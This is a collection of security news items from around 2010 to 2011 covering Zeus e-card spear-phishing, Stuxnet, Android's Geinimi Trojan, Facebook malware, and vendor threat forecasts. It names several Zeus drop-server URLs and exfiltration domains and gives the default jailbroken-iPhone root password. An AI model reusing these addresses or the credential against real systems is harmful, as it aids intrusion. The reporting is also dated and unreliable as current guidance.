Software Removal Tool (MSRT) that scrubbed the malware from Waledac-infected Windows PCs. In the second half of last year, MSRT and other Microsoft software, notably the free antivirus program Microsoft Security Essentials, cleaned 96,000 systems of Waledac, boasted Jeff Williams, the director of Microsoft's Malware Protection Center, today. Williams, who urged users to run MSRT and keep their anti-virus software up to date, also hinted that Microsoft had more on Waledac than it had disclosed. \"We're not done,\" he said. \"Stay tuned.\" News Source : Microsoft" }

The top 10 data is compiled from monthly scans performed by GFI's award-winning anti-malware solution, VIPRE® Antivirus, and its antispyware tool, CounterSpy®, as a service of GFI Labs™. Users were targeted with a variety of infected email, web links and other delivery mechanisms promising festive information, discount offers, Christmas e-cards and free software. The month also saw the big movie release of the season, Disney’s TRON Legacy, targeted by a wide array of SEO poisoned links, unwanted installs and other malware fakery, while a spate of fake iTunes emails caught several people off-guard, resulting in users running afoul of a malicious script that took advantage of a known Java exploit. GFI researchers also uncovered an Amazon receipt generator scam aimed at fooling retailers into honoring fraudulent receipts during the busy holiday shopping season.December once again saw significant activity from Trojan threats, which continue to dominate the overall malware landscape. Seven of the top 10 malware detections were Trojans, with those seven accounting for almost 35% of all malware detections for the month. In addition to a range of Trojans, Worms also created major problems during December. Most significant was Worm.Win32.Downad.Gen (v), appearing at number seven in December's top 10, a detection for the Downadup worm, otherwise known as Conficker and Kido.Taking advantage of a vulnerability in Windows Server service which allows remote code execution when file sharing is enabled, the Worm spreads across networks as well as removable drives, taking advantage of weak administrator passwords along the way. It commonly turns off some system services and anti-malcode protection, exposing infected systems to additional infection from other malware.“Following on from the increased themed threat traffic we saw in November around Thanksgiving, Black Friday and Cyber Monday, criminals once again attempted to take advantage of Christmas and the holiday season with themed attacks designed to drive users towards infected sites and to trick them into opening infected email and executables. Themed attacks, along with themed SEO poisoning and fake application installs, are firmly established as a successful means for malware creators to distribute malcode and create disruption for organizations and families alike,” said Tom Kelchner, communications and research analyst for GFI Software.“December is a challenging month for computing security, with many businesses shut for a prolonged period and consumers at home for the holidays. Casual computer use rises and vigilance can drop, creating opportunities for malware infection that would otherwise not happen the rest of the year. The top 10 serves as a stark reminder that IT security should not be taken for granted at any time,” Kelchner added.The problem of fake software was highlighted by FraudTool.Win32.FakeVimes!delf (v), number nine on this month’s top 10. This is a heuristic detection for files associated with the FakeVimes family of rogue security products, illustrating the continued growth of fake and compromised security applications as a means to circulate and covertly install malware onto PCs.ThreatNet is GFI Lab’s monitoring system that retrieves real-time data from VIPRE installations.

A Naked Security reader, George, who had been exposed to it on Facebook reported it to us - unlike the majority of Facebook scams we report, this one actively infects your computer with malware instead of simply tricking you into taking surveys and passing on messages to other users. The link in his Facebook chat from a friend pointed to an app.facebook.com/CENSORED link. Typically when you go to a Facebook app page it prompts you to add the application and grant it permission to post on your behalf or read your profile data. The scary part about this one is that it immediately prompts you to download a \"FacebookPhotos#####.exe\" file with no prompting or clicking required. The screen reads \"Photo has been moved. This photo has been moved to other location. To view this photo click View Photo.\" If your computer has not already downloaded the malware, the \"View Photo\" button will download the virus for you. It is really unfortunate that Facebook scams are moving back towards spreading malware. Fortunately, users of Sophos Anti-Virus had proactive protection from this threat with both our HIPS and suspicious file detection technologies; this particular strain is now identified by Sophos as W32/Palevo-BB. The good news is that even as I was writing this article, Facebook removed the malicious application from its service. But there are probably many more applications like this one making the rounds, so, as always, beware of unusual messages from friends whether they are in email, on their walls, or in an instant message.

Spear phishing went mainstream over the holiday season when dozens of government employees in the U.S. and other nations were lured into downloading a malicious program. \"[It was] essentially a malware-laced email that made it look like a season's greetings from the White House,\" security blogger Brian Krebs told CBC News. \"[The email] invites the folks to download an e-card, essentially a zipped-up executable file that if you run lets the bad guys take control of your system remotely.\" Krebs, who wrote about the story on his website KrebsonSecurity, said about two gigabytes of documents were downloaded to a server in Belarus. A number of government employees and contractors who work in cybersecurity matters fell for the ruse. \"It is something that folks are just waking up to,\" he said. FBI warns consumersThe FBI describes spear phishing as a \"rising cyber threat you need to know about.\" The agency says criminals need some inside information on their targets to make the emails look legitimate. That's often done by hacking into an organization's computer network, but can also be achieved by combing through social networking sites, blogs, and other websites. The recent theft of customer email lists from Honda and McDonald's are examples of how cybercriminals can gain access to that kind of personalized information, Krebs told CBC News in an interview. \"If you have a brand and you have a list of customers, by the way who have asked to get communications from this brand, and they're OK with it and they're expecting it — that's really dangerous in the hands of somebody who wants to do targeted attacks,\" he said. \"I think we're only going to see more of this.\" The computer security firm Symantec reports that spear phishing emails accounted for 6.3 per cent of the estimated 95.1 billion phishing emails in 2010. The tactic was unheard of prior to 2005. The difference between regular phishing and spear phishing is the sophistication of the ploy, Krebs notes. On a regular phishing expedition cybercriminals flood the internet with spam emails. The targeted spear phishing approach gets much better results with far fewer emails. Krebs says there's only one way to ensure you don't become a victim. \"The easiest way to stay out of trouble with respect to this type of thing is just to have a healthy sense of wariness.\" News Source : Google" }

In particular, criminals managed to create one-third of all viruses ever seen, 34% of all malware in existence, and 40% of all known fake AV. Those findings come from a study released Wednesday by PandaLabs, the malware research arm of antivirus vendor Panda Security. The firm said it had analyzed 99.4% of the 134 million unique files its systems automatically collected in 2010. Of those files, 60 million were malware -- viruses, worms, Trojans, and other threats. The report also found that the volume of new malware created -- about 20 million new strains -- remained roughly constant from 2009 to 2010, while the number of new threats overall increased. Between the beginning and end of 2010, according to PandaLabs, \"the average number of new threats created every day has risen from 55,000 to 63,000.\" While names such as Zeus and Bredolab continue to make headlines -- since they're behind many attacks -- most unique instances of malware appear to be nearly disposable. Indeed, whereas many attacks used to circulate for months before disappearing, Panda found that 52% of new malware in 2010 existed for only 24 hours. According to PandaLabs, \"as antiviruses become able to detect new malware, hackers modify them or create new ones so as to evade detection.\" Unsurprisingly, given the financial incentive behind many attacks, the most prevalent type of malware in 2010 was the banking Trojan, which comprised 56% of all new malware, followed by those perennial favorites viruses (22%), worms (10%), and adware (10%). Interestingly, spyware declined from comprising 6% of all malware in 2009 to just 0.34% in 2010. Meanwhile, roughly 1% of threats in 2010 collectively comprised dialers, hacking tools, PUPs (potentially unwanted program), security risks, jokes, or tracking cookies. Interestingly, Panda found that 53% of all computer users experienced a malware infection in 2010, even when using up-to-date antivirus scanners and signatures. News Source : Google" }

The report prepared by specialists and searchers in the business also says the mentioned attacks' main purpose will be to steal data, also known as 'phishing' Attacks on Facebook and other social networks are likely to increase over the coming year, according to a report from ESET, an IT security company, on possible threat trends for 2011.Social media will be a focus for social engineering attacks such as those already commonly experienced by users of Facebook and Google, according to ESET’s new San Diego-based Cyber Threat Analysis Center, or CTAC.Furthermore, it is likely there will be an increasing volume of attacks on other social networking sites such as LinkedIn, Orkut and Twitter, as well as other search engines such as Bing and Yahoo, the research team said.Such attacks on the secondary platforms are likely to increase given the measures Facebook and Google are taking to protect themselves.According to the CTAC, Facebook presents a particular danger because it could continue to ask its users to assume more responsibility for protecting their own data, as the site could share information with third parties unless users expressly request that such data not be shared.Some sites such as Bebo have moved away from disclosing zero information to disclosing some information as sharing data with third parties is occasionally crucial, the CTAC said.Mobile devices will be targeted increasingly, the team said, adding that brands protected by sound application of approved address lists will be much less vulnerable to malware attacks.Despite all the precautions, attacks on social media are still expected to rise, the team said.While botnets are no longer new, they will continue to grow in significance during 2011 as Shadowserver data indicates continuing growth in botnet volumes, while ThreatSense.Net data has shown a comparable growth in bot malware volumes, which all indicates that zombie PCs will constitute a higher proportion of all infected systems.Botnet threat still anticipatedIt is also expected that following the prominence in 2010 of botnets controlled through Twitter, “botherders” will experiment with other command and control channels.In spite of the news, the recent successes in taking down botnets are expected to continue and perhaps even increase, according to ESET.The CTAC team also said botnets would continue to be a major problem, but hoped that more people would realize that smaller low-profile botnets pose at least as big a threat as larger botnets that are being examined so closely by security researchers that they may be abandoned by their creators.Most malware will continue to infect through usual channels, such as email, malicious URLs, forums and newsgroups, by tricking computer users into clicking on something that can infect the operating system, the CTAC said.Still, it is likely that problems stemming from specific vulnerabilities of files known as .lnk will also appear occasionally – although one can hope that those with malicious intentions are not able to profit from the problems.Further SCADA data-stealing attacks are also likely, the CTAC said, adding that it would probably stem from spear-phishing and malware or from Trojans, rather than self-replicating malware like Stuxnet.However, Stuxnet’s main purpose seems to have been sabotage, the team said. While the CTAC said the Stuxnet code could easily be adapted to attack all sorts of unrelated installations was untrue, it added that it expected that the use of malware for purposes of sabotage would remain the subject of speculation and active investigation.Additionally, automated social networking site scraping tools, as well as data leaks, will reduce the cost of creating spear-phishing attacks, leading to several high-profile attacks, the CTAC said." }

The holiday e-card scam is a typical year-end spam tactic and often will include malware of one type or another. But the latest incarnation was different in that it included a malicious executable related to the Zeus botnet and it seems that officials in a number of government agencies in the U.S. and elsewhere fell for the scam and ended up exposing gigabytes of government documents. One of the executables being used in the e-card attack is nearly identical to a file that was used in a similar attack in February 2010 that was detailed by security firm NetWitness at the time.In the frst stage of the latest attack, the user clicks on a link in the malicious e-card and a process started that downloaded a variant of the ever-popular Zeus bot. That bot's purpose in life is much like any other's: to steal information related to online banking, payment sites, eBay and other valuable sites. That data is then sent off to a remote drop server. NetWitness identified three of the drop servers, all of which are down right now, as:http://209.172.60.242/~newdowni/stat/gate_in.phphttp://someonesome.mobi/imgs_ctn/icon_sml/gate_in.phphttp://shock-world.mobi/zs/tmp/gate.phpBut that's only one piece of the action. The second stage of this attack downloads an executable file called \"pack.exe\" that searches the HDD of the compromised PC for a number of common file types, including Word documents, PDFs and Excel files. Those files are then sent to another server controlled by the attacker. An analysis of the executable, compared to one used in the original attack last year, found that the two files are nearly identical in size and bear a number of other similarities, as well.\"An interesting sidenote to this particular aspect of the kneber data was that the ZeuS bot that was involved with this phish had a second stage download of an executable called “stat.exe”. This malware was revealed to be a perl script converted to a stand-alone executable with the perl2exe tool.This malware searched the local harddrive of the victim PC for xls,doc and pdf files, and uploaded them via FTP to:packupdate.comWhich at the time, resided on a server in Belarus. This current spam run, also downloaded a second-stage executable, called “pack.exe”, which was also:- A perl2exe exectuable - Searched the victim PC for all xls, doc and pdf files - Uploaded stolen information to a server in Belarus, which resolved to “uploadpack.org”So in this case, we have two executables, and three domain names, that have three converging elements, (pack, belarus and perl2exe),\" Alex Cox, principal research analyst at NetWitness said in his analysis of the new attack.At the time the original attack was revealed in February 2010, NetWitness officials did not talk about the fact that the executable that the malware downloaded was a Perl script that had been converted using a tool called Perl2exe. The fact that this current attack includes a file that also was created using that tool and is so similar in other respects to the original one is likely more than a coincidence, Cox said.\"This, because it is such a small and fairly unknown aspect of the kneber compromise, makes us think that this is indeed the same operator, who is again after documents pertaining to U.S. Government activities,\" he wrote.News Submitted By : Om Rathore" }

This type of honey lures in a different kind of bears. The bears those are present in the cyber jungle. Yes, we are talking of the black hat hackers which are hell bent on intruding your file systems and scratching out info. Read Complete Tutorial and Guide on Honeypots : Honeypot / Honeynet - Tracking the Hackers ! (Video Tutorial for setup & Usage) : Indian Cyber Army So, we are now going to discuss this very new and amazing feature, which only a few of the countries in world stand to have, including ours. Explaining with examples is always easy. Recently, a very famous Turkish hacker was busted using these techniques of Honeypot. The hacker was supposed to have the reputation of breaking into all the major sites of the fortune 500 repute. Yet, he also tried to venture into the space of our very own friend Google, who eventually has laid down a trap in the form of a Honeypot to capture this vicious criminal. So, exactly a Honeypot is something like, the website, creates a vulnerability on the net, and lures in the attackers to hack using that same vulnerability. But, it actually is not a real vulnerability, but a pathway created so that the attacker may enter through it and directly all his system info, including his physical location can be targeted without him knowing that it may be a trap. These types of traps are generally called Honeypots. Indian government has also got Honeypots on most of its major sites. These sites have been severely under the target of the Pakistani cyber army as well as their defences, who have very confidently written on their website about the Honeypot problems which prevent them from entering the secure, and classified space of Indian cyber net. Speaking of the Gujarat government, which has impressed us upon its recent developments in IT industry, considering its e-governance options, which we had seen last time, this government also, has its own Honeypot which is quite operational and has been in work for the government. Honeypots in general are very useful and also can be used in your intranet security solutions. These are used in many other ways to find intrusions, the number of attacks that a website suffers, as well as it can be used for nabbing those black hat hackers, which use software and malwares that can destroy precious data." }

This means it is possible for criminals to hack into their system and steal identity details.The survey, commissioned by web security experts Norton, found that almost one in two people now believe they are more likely to fall victim to cybercrime than conventional crime.The rise of smartphones, tablet and notebook computers is making users more vulnerable.Detective Superintendent Charlie McMurdie, of the Metropolitan Police Central E-Crime Unit, said: “Countless new applications and mobile devices, such as smartphones and tablets with internet connectivity, have hit the market in recent years.“The reality is that technological advances provide not just benefits for the legitimate users, but also present potential opportunities for criminals to exploit. Users need to ensure they think about security and protection of their devices and their data.”Susan Daley, the Government Affairs Officer at Norton, warned: “Next year, it’s highly likely we will see more people falling victim to cybercrime than ever before.“Anyone who spends a lot of time online should commit to taking their online personal protection seriously.”THE CYBER RISKSSocial media identity theftOn Facebook many people display a huge amount of personal information which can be used against them by criminals.Smartphone and tablet hackingCriminals can set up temporary, and apparently innocent, wi-fi hotspots, which will capture the details of people who log on to the web via this link.Hijacking social fadsSpying software Ð malware Ð can be attached to websites and forums.

The Geinimi Trojan sends location co-ordinates, unique device identifiers, and a list of installed apps on the infected device to a remote server. Additionally, it can independently download applications and prompts the user to install them, mobile security company Lookout said on Wednesday. \"Geinimi’s author(s) have raised the sophistication bar significantly over and above previously observed Android malware by employing techniques to obfuscate its activities,\" Lookout said in a blog post on Wednesday. \"In addition to using an off-the-shelf bytecode obfuscator, significant chunks of command-and-control data are encrypted. While the techniques were easily identified and failed to thwart analysis, they did substantially increase the level of effort required to analyse the malware.\" When an application containing the Trojan is launched on an Android device, the Trojan will run in the background and collect data. At five minute intervals the Trojan will attempt to connect to a remote server using one of 10 domain names and, if it establishes a connection, transmits data to the server. The Trojan has \"botnet-like\" capabilities, according to Lookout, as it can respond to remote requests, but Lookout is yet to find evidence of a control server sending commands back to Trojans on individual devices. The Trojan is distributed inside applications, primarily games, that are redistributed on third-party Chinese Android app markets. Games that have been repackaged to contain the Trojan include Monkey Jump 2, City Defence and Sex Positions. Lookout has not seen any applications containing the Geinimi Trojan in the official Google Android Market. Lookout advises Android users to only download applications from trusted sources and to check the permissions made by applications on app requests. In September a variant of the Zeus banking Trojan, which is used to gather banking information, was found actively running on phones on the Symbian operating system." }

Word 2008 and 2011 for the Mac have also been patched, but Microsoft has not yet issued a fix for the same flaw in the older Word 2004. The circulating attacks affect only Windows versions of the suite, however. According to the Microsoft Malware Protection Center (MMPC), the group that investigates attack code and issues signature updates for the company's antivirus software, the first in-the-wild exploits were detected last week. When Microsoft shipped the Word patch last month, it rated the bug as \"1\" on its exploitability index, meaning it believed a working attack would pop up within 30 days. The attack uses a malicious RTF (Rich Text Format) file to generate a stack overflow in Word on Windows, said MMPC researcher Rodel Finones. Following a successful exploit, the attack code downloads and runs a Trojan horse on the compromised computer. Finones said that the code \"reliably exploits this [Word] vulnerability.\" Last month, Microsoft rated the RTF vulnerability as \"critical\" in Word 2007 and 2010, but as \"important\" in all other affected versions. At the time, outside researchers had put their bets on the bug as a hacker choice because users running Office 2007 or 2010 could be attacked if all they did was preview a specially-crafted RTF document in the Outlook e-mail client. \"Once a [malformed] message hits the Outlook preview pane, remote code can be executed. You should patch this right away,\" Jason Miller, the data and security team manager for Shavlik Technologies, said on the day Microsoft released the patch. Finones urged users who have not yet installed the November patch to do so as soon as possible. More information about the vulnerability can be found in the MS10-087 security bulletin. The MS10-087 update can be downloaded and installed using Microsoft Update and Windows Server Update Services (WSUS)." }

And while it is likely the darling of Western governments for the disruption it unleashed on Iran's embryonic nuclear program, there are emerging concerns that variants of the Stuxnet virus could bring widespread havoc to systems around the world - beyond the traditional information technology targets.eWeek reported on Tuesday that the Stuxnet worm is thought to have damaged as many as 1,000 Iranian centrifuges, after having already affected more than 62,000 computer systems in Iran alone. The genius of the Stuxnet code was reported in the mild manipulation of the centrifuge engine speeds, prompting the engines to operate just fast enough to break down.This manipulation was made possible with code commands inserted through common USB thumb drives, a subtle approach that transported the worm from computer operating systems to the electronic operating systems of the centrifuge engines.The inevitable evolution of the Stuxnet worm is now expected to yield variants that can target multitudes of electronic operating systems - such as those governing national power grids, according to eWeek.\"We need to think above and beyond expected targets, which are not servers or routers,\" Adam Bosnian, an executive vice president for information security company Cyber-Ark, told eWeek.According to a August 2010 Symantec study on the impact of the Stuxnet worm, the malware code has hit 62,867 computers in Iran; 13,336 in Indonesia; 6,552 in India; 2,913 in the United States; 2,436 in Australia; 1,038 in the United Kingdom; 1,013 in Malaysia; and 993 in Pakistan.Cybersecurity experts consider the Stuxnet worm a \"groundbreaking\" piece of code.\"It's amazing, really, the resources that went into this worm,\" Liam O Murchu, manager of operations with Symantec's security response team told.But the future applications of this bug - and the infinite offshoots Stuxnet will inspire - have begun to raise considerable concerns." }

According to Luis Corrons, Panda's technical director, during 2010 we have seen a significant growth in the amount of malware, a constant theme over the last few years. \"This year, more than 20 million new strains have been created, more than in 2009. At present, Panda's collective intelligence database stores a total of over 60 million classified threats. The actual rate of growth year-on-year however, appears to have peaked: some years ago it was over 100%. In 2010 it was 50%. We will have to wait and see what happens in 2011\", he said in a security blog. Corrons added that, also during 2010, with Stuxnet and the WikiLeaks cables suggesting the involvement of the Chinese government in the cyberattacks on Google and other targets, a turning point in the history of these conflicts has occured. In cyberwars, he says, as with other real-world conflicts today, there are no ranks of uniformed troops making it easy to distinguish between one side and another. \"This is like guerrilla warfare, where it is impossible to discern who is launching the attack or from where. The only thing it is possible to ascertain is the objective\", he explained. Corrons argues that, in the case of Stuxnet, it was clearly an attempt to interfere with processes in nuclear plants, and specifically, with uranium centrifuges. Attacks such as these, he says, albeit more or less sophisticated, are still ongoing, and will no doubt increase during 2011, although many of them will go unnoticed by the general public. And so on to cyberprotests which were, he says, the major new issue in 2010. Cyberprotests – or hacktivism – he adds, are all the rage. This new movement was initiated by the Anonymous group and Operation Payback, targeting firstly organisations trying to close the net on Internet piracy, and later in support of Julian Assange, editor-in-chief of WikiLeaks. Even users with limited technical know-how can join in the distributed denial of service attacks (DDoS) or spam campaigns, he noted. \"Despite hasty attempts in many countries to pass legislation to counter this type of activity, effectively by criminalising it, we believe that in 2011 there will be yet more cyber-protests, organised by this group or others that will begin to emerge\", he said. \"The internet is increasingly important in our lives and is a channel for expression that offers anonymity and freedom, at least at the moment, so we will no doubt see more examples of this kind of civil protest\", he added. Other areas of concern for 2011, Corrons went on say, will include security problems involving social engineering, as well as Windows 7 influencing malware development. \"As we mentioned last year, it will take at least two years before we start to see the proliferation of threats designed specifically for Windows 7. In 2010 we have begun to see a shift in this direction, and we imagine that in 2011 we will continue to see new cases of malware targeting users of this new operating system\", he said. There will also be security problems surrounding cellular phones, as they make the transition to smartphones, he says, adding that his prediction for 2011 is the number of threats for Android will increase considerably throughout the year, as the platform becomes the number one target for cyber-crooks. The overall picture with IT security, he notes, is not improving and whilst we have seen several hacker arrests in 2010, they have been sadly insufficient when we consider the scale of what we are fighting against. \"Profits from this black market amount to thousands of millions of dollars, and many criminals operate with impunity thanks to the anonymity of the Internet and numerous legal loopholes\", he said. \"The economic climate has contributed to the seriousness of the situation: as unemployment grows in numerous countries, many people see this as a low risk opportunity to earn money, though this does not detract from the fact that it is a crime\", he added." }

The firm outlines its top threats for next year in the 2011 Threat Predictions report -- and Android, iPhone, Foursquare, Google TV, and Mac OS X are listed as major cybercrime targets. Politically motivated attacks are also expected to increase, a la WikiLeaks. \"We've seen significant advancements in device and social-network adoption, placing a bullseye on the platforms and services users are embracing the most,\" said Vincent Weafer, senior vice president of McAfee Labs. \"These platforms and services have become very popular in a short amount of time, and we're already seeing a significant increase in vulnerabilities, attacks and data loss.\" Social-Media Threats Social-media threats are nothing new, but expect to see more of them next year. McAfee Labs expects social-media services that use URL shortening will be under attack because its easier for cybercriminals to mask the full URL and direct users to malicious web sites. Then there's geolocation services like Foursquare, Gowalla and Facebook Places. In just a few clicks, cybercriminals can see in real time who is tweeting, where they are located, what they are saying, what their interests are, and what operating systems and applications they are using. That opens the door to targeted attacks. On the mobile front, McAfee predicts the widespread adoption of mobile devices in business environments, combined with a historically fragile cellular infrastructure and slow strides toward encryption, will bring a rapid escalation of attacks and threats to mobile devices, putting user and corporate data at very high risk. Apple No Longer Immune Historically, the Mac OS platform has remained relatively unscathed by malicious attackers, but McAfee Labs warns that Mac-targeted malware will continue to increase in sophistication in 2011. The popularity of iPads and iPhones in business environments, combined with the lack of user understanding of proper security for these devices, will increase the risk for data and identity exposure, and will make Apple botnets and Trojans a common occurrence. \"The reason Apple represents a top security threat is because iPhones are coming into the enterprise and they don't fall within the security-management infrastructure that's in place,\" said Rob Enderle, principal analyst at the Enderle Group. \"So you don't know who is using the phone, you don't know what's on the phone, and it's much harder for you to contain any threats the phone represents.\" Threats and More Threats Rounding out the threat report, new Internet TV platforms, such as Google TV, are also going to be under attack, McAfee reports, and your next computer virus could come from a friend. Malicious content disguised as personal or legitimate e-mails and files to trick unsuspecting victims will increase in sophistication in 2011. McAfee Labs predicts that the recent merger of Zeus with SpyEye will produce more sophisticated bots due to improvements in bypassing security mechanisms and law-enforcement monitoring. And McAfee believes hacktivism will become the new way to demonstrate political positions in 2011 and beyond. Finally, McAfee Labs warns that companies of all sizes that have any involvement in national security or major global economic activities should expect to come under pervasive and continuous Advanced Persistent Threat attacks that go after e-mail archives, document stores, intellectual-property repositories, and other databases." }

The proof-of-concept implementation of the infection technique, known as Troj/EUDPoC-A, was posted to a Chinese educational forum before being discovered by anti-virus researchers from various security firms. Chester Weisniewski, of anti-virus vendor Sophos, warns that the technique used by the Trojan 'enables an attacker to impersonate the system account, which has nearly unlimited access to all components of the Windows system,' and does so without triggering the User Access Control protections introduced by Microsoft to prevent exactly that occurring. The flaw targeted by the code is thought to exist in all versions of Windows from Windows XP onwards - including Windows 2008 R2 and fully-patched Windows 7 systems, and thus far no fix for the issue is available from Microsoft. Marco Giuliani of security firm PrevX warns that the proof of concept code 'could potentially become a nightmare' as ne'er-do-wells rush to take advantage of the flaw before it is patched by Microsoft. 'We expect to see this exploit being actively used by malware very soon,' Giuliani explained, 'it's an opportunity that malware writers surely won't miss.' The vulnerability is thought to be under active investigation by Microsoft, but so far there has been no word as to an estimated release date for a fix. In the meantime, Sophos has a workaround for the flaw, but it is unlikely to offer much protection against maliciously modified variants. Are you disappointed that Microsoft's UAC is proving to be a poor protection, or just anxious for Microsoft to get the flaw fixed as soon as possible? Share your thoughts over in the forums." }

After a visit to eBay, he received an e-mail message that his account had been hacked. The e-mail led him to what looked like an eBay website that asked for his user name and password.Fisher looked at the web address and realized he wasn't visiting eBay.“As soon as I entered (information), I had that ‘Oh, crap' feeling,” Fisher said.He immediately visited the real eBay site and changed his password.“I consider myself pretty good at this stuff and I got spammed,” he said.How can computer users avoid malicious e-mails that, pixel for pixel, look legitimate?“Don't get on the Internet,” quipped Samuel Rickard, owner of Advanced Micro Services in Sheffield.If you need to be connected, however, Rickard suggests making sure your operating system is up to date, be careful of the websites you visit and install anti-virus programs along with those such as Malwarebytes or Spybot Search and Destroy.Originally, spyware programs watched what you bought on the Internet, Rickard said. Then these programs turned into malware, programs that attack your computer.Now, the latest trend is ransomware, programs that request payment to get rid of a supposed virus on your computer. Without payment, your computer won't work properly, or so these programs claim.“They want your credit card number. You're not infected with a true virus, you're infected with an annoyance,” Rickard said.Months after clearing a ransomware program, one customer had $2,700 charged to his credit card for a bogus charge of weapons sold in Yemen, Rickard said. The customer later got the charges reversed.The virus war is getting even more extreme with rootkits and bootkits that infect computers and don't allow installation of anti-virus programs or stop computers from being able to boot up.Fisher likens the Internet to driving on a highway — a couple of scares make most people aware of the dangers, but accidents still happen.“It's going to take people getting taken once or twice before getting it,” he said.

The bug allows hackers to inject malware onto any system if they manage to trick users into visiting booby-trapped websites. Anyone with Internet Explorer (IE) 6 to 8 is potentially affected. The code to exploit the bug has already been published. The computer giant said there was no evidence it was being used yet by criminals but they were \"investigating\" and working on a permanent fix, reports the Daily Mail. Dave Forstrom, director of Microsoft's Trustworthy Computing group, said: \"We're currently unaware of any attacks trying to use the claimed vulnerability or of customer impact.\" The bug targets how the browser manages a computer's memory when it is processing Cascade Style Sheets - which are design instructions that determine how most web pages look. Hackers can inject their own code into the stream of instructions and in this way hijack the PC. Although Microsoft has improved how memory management is protected, it does not work when some older parts of Windows are called on. The bug first came to light on the seclists.org full disclosure mailing list earlier this month. Rik Ferguson, security analyst at Trendo Micro, told the BBC: \"As vulnerabilities go, this kind is the most serious as it allows remote execution of code. \"This means the attacker can run programmes, such as malware, directly on the victim's computer.\" \"It is highly reminiscent of a vulnerability at the same time two years ago which prompted several national governments to warn against using IE and to switch to an alternative browser.\"" }

Earlier this month, IT security firm Sophos traced the history of malware and viruses which were created over the Christmas period from 1987 until 2009. The blog post revealed that, although some were relatively harmless festive pranks, more and more cyberattacks over the holidays could have serious repercussions for computer users. Rik Ferguson, senior security analyst at Trend Micro, claimed hackers conduct such attacks on an annual basis. \"Criminals absolutely do, every year without fail, conduct campaigns designed to take advantage of people's willingness to search for and click on links relating to Christmas activity, whether that's going to be through phishing campaigns or sending social engineering emails masquerading as Christmas cards,\" he said. Mr Ferguson added that apps on social networking sites had \"come of age as an attack platform\" and were \"being extensively abused\" by cybercriminals.

Although money is tight, it is important companies stay protected online, as on average, the total cost of security breaches including lost business in the UK last year was $2,565,702 (US dollars). Data theft and other online threats presently represent a significant danger for businesses in the UK. Compounding this problem is the economic downturn, which is leading many executives to cancel, defer or downsize security budgets. To highlight the risks facing companies today, Astaro has compiled the following list detailing the five most serious internet security holes. 1. Browser vulnerabilities No provider is immune to the security holes that keep appearing in web browsers. A recent example is the CSS bug that affected Internet Explorer versions 6, 7, and 8 (CVE-2010-3962). This bug targets the computers in a two-stage attack: First, the user follows an e-mail link to a web page containing malicious code. This code is then run without the user realizing it and automatically installs a trojan on the computer. The user does not need to click the mouse; simply visiting the website is enough. The only way companies can protect themselves fully from this is to refrain from using any browsers with current known security holes for as long as they remain unpatched. 2. Vulnerabilities in Adobe PDF Reader, Flash, Java The ubiquity of tools and programs such as Adobe PDF Reader, Flash, and Java makes them highly vulnerable to attack. Although they do frequently show security holes, most providers are quick to provide patches. However, companies then have to make sure these patches are installed on all computers - which is where they often fall down. Either the IT departments are not aware of the patches, are unable to install them, or bemoan the fact that the update failed. In this case, if an employee visits a page with embedded Flash videos that launch automatically, malicious code can then be run automatically in the background. With the user being completely unaware of it, a trojan will infiltrate the computer unnoticed, making it part of a botnet. While there are only a few Windows exploits, for instance, there is a vast number in Adobe, Java, and Flash. Flash and Java, in particular, have become veritable malware disseminators over the past few months, providing the perfect access point for trojans lurking in the background of colorful websites, which then bypass all virus scanners to become permanently ensconced on the computer. Private users should therefore never use these programs and companies should employ standard procedures or policies prohibiting their use. To prevent attacks via Flash, companies can use Flash blockers (a browser plug-in) to prevent videos from being played automatically. 3. Vulnerabilities in Web 2.0 applications The latest web-based security holes of note tend to be new methods of attack, such as Cross-Site Scripting (XSS) or SQL Injection. The cause of the vulnerability in this case is generally inaccurate or incorrect implementation of AJAX, a method for exchanging data asynchronously between server and browser. This type of vulnerability was exploited, for example, by the MySpace worm created by the hacker known as Samy. It was published around a year ago and allowed the hacker to swiftly obtain and access the profiles of millions of MySpace contacts. Another, more recent attack was the \"on mouse over\" attack on Twitter. This attack was particularly sophisticated because its authors were able to embed malicious code that disseminated itself and directed users to websites containing malware in just 140 characters and without any clicking required. All the user had to do was move the cursor over the Tweet. There is very little users of such applications can do to protect themselves against this other than to stop using the service as soon as a security problem is made public. It is therefore the manufacturers' responsibility to ensure that their applications are well and securely programmed – or to take the precautionary measure of protecting the data of its users with a Web Application Firewall. 4. Cell phone and smartphone data security holes In the UK alone, there are currently more mobile phones than people. This very fact means that new data security risks are being discovered in this arena on a daily basis. For instance, there is a new generation of worms specifically targeted at smartphones (let's call them \"iWorms\"). In September, it was discovered that the ZeuS botnet was specifically attacking cell phones. Using infected HTML forms on the victim's browser, it would obtain their cell number and then send a text message containing the new malware SymbOS/Zitmo.A!tr (for \"Zeus In The Mobile\") to this number. The malware, which was designed to intercept and divert banking transactions, would then install itself in the background. Many Apple users wishing to circumvent SIM card restrictions to a specific network provider or to use applications that are unavailable through the Apple store perform a process known as jailbreaking to remove the usage and access limitations imposed by Apple. This process allows users to gain root access to the command line of their device's operating system. The risk inherent with jailbreaking is that it makes many of the devices more vulnerable to attack; for instance, the majority of users do not change the SSH password after performing a jailbreak – this is a serious failing because Apple's default root password \"alpine\" is now widely known. If the password is not changed, the device is susceptible to unauthorized third-party access. 5. Zero-day exploits in operating systems Zero-day attack is the term given to a threat that uses vulnerabilities that are unknown to others and for which there is no patch. In other words, the manufacturer of a system first becomes aware of the vulnerability on the actual day of the attack - or even later. This gives hackers the perfect opportunity to exploit holes. This type of operating system attack is particularly dangerous because the cyber criminals have direct remote access to the affected systems. They require no additional tools such as browsers or Java, the only requirement is that the target computer is online. There is no way to protect against zero-day exploits because patches and first-aid measures can only be published retroactively. It is not only Microsoft computers that are affected by this problem; the growing prevalence of Macs means that they are also becoming a target for zero-day attacks." }

The worm, dubbed \"W32.Yimfoca\" by the security company Symantec, is being spread through Yahoo!

First, the worm sends an instant message to users that includes a corrupted link. When a user clicks the link, the worm installs malware on their system.

